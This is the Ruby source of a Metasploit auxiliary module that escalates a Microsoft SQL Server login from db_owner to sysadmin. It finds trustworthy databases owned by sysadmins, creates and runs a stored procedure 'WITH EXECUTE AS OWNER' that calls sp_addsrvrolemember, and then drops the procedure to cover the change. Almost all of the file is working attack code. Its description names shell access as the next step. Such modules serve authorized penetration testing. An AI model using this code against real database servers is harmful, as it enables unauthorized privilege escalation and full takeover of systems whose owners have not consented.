##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/mssql_commands'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server - Escalate Db_Owner',
      'Description'    => %q{
        This module can be used to escalate privileges to sysadmin if the user has
        the db_owner role in a "trustworthy" database owned by a sysadmin user.  Once
        the user has the sysadmin role the msssql_payload module can be used to obtain
        a shell on the system.
      },
      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
      'License'        => MSF_LICENSE,
      'References'     => [[ 'URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
    ))
  end

  def run_host(ip)
  # Check connection and issue initial query
  print_status("Attempting to connect to the database server at #{ip} as #{datastore['username']}...")
  if mssql_login_datastore == false
    print_error('Login was unsuccessful. Check your credentials.')
    disconnect
    return
  else
    print_good('Connected.')
  end

  # Query for sysadmin status
  print_status("Checking if #{datastore['username']} has the sysadmin role...")
  begin
    mystatus = check_sysadmin
    rescue
    print_error('Sorry, the database connection failed.')
  end

    # Check if user has sysadmin role
    if mystatus == 1
    print_good("#{datastore['username']} has the sysadmin role, no escalation required.")
    else

    # Check for trusted databases owned by sysadmins
    print_status("You're NOT a sysadmin, let's try to change that.")
    print_status("Checking for trusted databases owned by sysadmins...")
    trustdb_list = check_trustdbs
    if trustdb_list == 0
      print_error('No databases owned by sysadmin were found flagged as trustworthy.')
    else

      # Display list of accessible databases to user
      trustdb_list.each { |trustdb|
        print_status(" - #{trustdb[0]}")
      }

      # Check if the user has the db_owner role in any of the databases
      print_status('Checking if the user has the db_owner role in any of them...')
      dbowner_status = check_db_owner(trustdb_list)
      if dbowner_status == 0
        print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
      else

        # Attempt to escalate to sysadmin
        print_status("Attempting to escalate in #{dbowner_status}...")
        escalate_status = escalate_privs(dbowner_status)
        if escalate_status == 1

          # Check if escalation was successful
          mystatus = check_sysadmin
          if mystatus == 1
            print_good("Congrats, #{datastore['username']} is now a sysadmin!.")
          else
            print_error("Fail buckets, something went wrong.")
          end
        else
          print_error("Fail buckets, something went wrong.")
        end
      end
    end
  end
  end

  # ----------------------------------------------
  # Method to check if user is already sysadmin
  # ----------------------------------------------
  def check_sysadmin
  # Setup query to check for sysadmin
  sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"

  # Run query
  result = mssql_query(sql, false) if mssql_login_datastore
  disconnect

  # Parse query results
  parse_results = result[:rows]
  mystatus = parse_results[0][0]

  # Return status
  return mystatus
  end

  # ----------------------------------------------
  # Method to get trusted databases owned by sysadmins
  # ----------------------------------------------
  def check_trustdbs
  # Setup query
  sql = "SELECT d.name AS DATABASENAME
  FROM sys.server_principals r
  INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
  INNER JOIN sys.server_principals p ON
  p.principal_id = m.member_principal_id
  inner join sys.databases d on suser_sname(d.owner_sid) = p.name
  WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'"

  begin
    # Run query
    result = mssql_query(sql, false) if mssql_login_datastore
    disconnect

    # Parse query results
    parse_results = result[:rows]
    trustedb_count = parse_results.count
    print_good("#{trustedb_count} affected database(s) were found:")

    # Return on success
    return parse_results
  rescue
    # Return on fail
    return 0
  end
  end

  # ----------------------------------------------
  # Method to check if user has the db_owner role 
  # ----------------------------------------------
  def check_db_owner(trustdb_list)
  # Check if the user has the db_owner role is any databases
  trustdb_list.each { |db|
    begin
      # Setup query
      sql = "use #{db[0]};select db_name() as db,rp.name as database_role, mp.name as database_user
      from [#{db[0]}].sys.database_role_members drm
      join [#{db[0]}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
      join [#{db[0]}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
      where rp.name = 'db_owner' and mp.name = SYSTEM_USER"

      # Run query
      result = mssql_query(sql, false) if mssql_login_datastore
      disconnect

      # Parse query results
      parse_results = result[:rows]
      if parse_results.any?
        print_good("- db_owner on #{db[0]} found!")
        return db[0]
      end
    rescue
      print_error("- No db_owner on #{db[0]}")
    end
  }
  end

 # ----------------------------------------------
 # Method to escalate privileges
 # ----------------------------------------------
  def escalate_privs(dbowner_db)
  # Create the evil stored procedure WITH EXECUTE AS OWNER
  begin
    # Setup query
    evilsql_create = "use #{dbowner_db};
    DECLARE @myevil as varchar(max)
    set @myevil = '
    CREATE PROCEDURE sp_elevate_me
    WITH EXECUTE AS OWNER
    as
    begin
    EXEC sp_addsrvrolemember ''#{datastore['username']}'',''sysadmin''
    end';
    exec(@myevil);
    select 1;"

    # Run query
    mssql_query(evilsql_create, false) if mssql_login_datastore
    disconnect
  rescue

    # Return error
    error = 'Failed to create stored procedure.'
    return error
  end

  # Run the evil stored procedure
  begin

    # Setup query
    evilsql_run = "use #{dbowner_db};
    DECLARE @myevil2 as varchar(max)
    set @myevil2 = 'EXEC sp_elevate_me'
    exec(@myevil2);"

    # Run query
    mssql_query(evilsql_run, false) if mssql_login_datastore
    disconnect
  rescue

    # Return error
    error = 'Failed to run stored procedure.'
    return error
  end

  # Remove evil procedure
  begin

    # Setup query
    evilsql_remove = "use #{dbowner_db};
    DECLARE @myevil3 as varchar(max)
    set @myevil3 = 'DROP PROCEDURE sp_elevate_me'
    exec(@myevil3);"

    # Run query
    mssql_query(evilsql_remove, false) if mssql_login_datastore
    disconnect

    # Return value
    return 1
  rescue

    # Return error
    error = 'Failed to run stored procedure.'
    return error
  end
  end
end
